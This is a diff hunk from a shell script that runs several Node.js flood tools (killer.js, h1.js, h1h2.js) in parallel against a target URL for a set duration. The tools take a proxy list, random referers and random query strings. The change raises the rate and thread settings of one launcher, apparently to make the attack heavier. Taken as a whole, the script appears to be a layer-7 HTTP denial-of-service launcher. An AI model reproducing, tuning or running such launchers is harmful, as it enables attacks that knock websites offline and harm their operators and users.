@@ -17,7 +17,7 @@ node killer.js POST "$URL" "$TIME" 1 1 live.txt --query 1 --referer rand --http 
 
 node h1.js POST "$URL" live.txt "$TIME" 999 24 randomstring="true" &
 
-node h1h2.js "$URL" "$TIME" 1 48 mix live.txt &
+node h1h2.js "$URL" "$TIME" 5 999 mix live.txt &
 
 
 wait
